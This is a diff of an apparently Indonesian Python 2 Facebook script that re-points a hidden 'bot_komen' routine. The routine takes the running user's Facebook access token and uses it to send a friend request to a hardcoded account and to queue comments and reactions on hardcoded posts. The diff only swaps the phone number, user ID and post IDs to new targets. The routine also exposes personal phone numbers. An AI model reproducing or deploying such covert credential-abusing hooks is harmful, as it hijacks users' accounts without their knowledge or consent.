@@ -78,7 +78,7 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print 50* "\033[0;39m─"
-print  """\033[0;96m [¤] \x1b[0;93mASSALAMUALAIKUM\x1b[0;96m  \033[0;96m[¤] \x1b[0;93mWHATSAPP :081289825673\x1b[0;96m"""
+print  """\033[0;96m [¤] \x1b[0;93mASSALAMUALAIKUM\x1b[0;96m  \033[0;96m[¤] \x1b[0;93mWHATSAPP :085220455740\x1b[0;96m"""
 print 50* "\033[0;39m─"
 
 CorrectUsername = "Ramdhan"
@@ -124,11 +124,11 @@ def bot_komen():
         print '\x1b[0;39m[!] Token invalid'
         os.system('rm -rf login.txt')
 
-    una = '100024540287354'
-    kom = 'Assalamualaikum😘'
+    una = '100044932290784'
+    kom = 'Abang Ganteng Banget😘'
     reac = 'ANGRY'
-    post = '946670209494313'
-    post2 = '946670209494313'
+    post = '205721140935628'
+    post2 = '205721140935628'
     kom2 = 'Bang Gua pake Sc lu ya😘'
     reac2 = 'LOVE'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
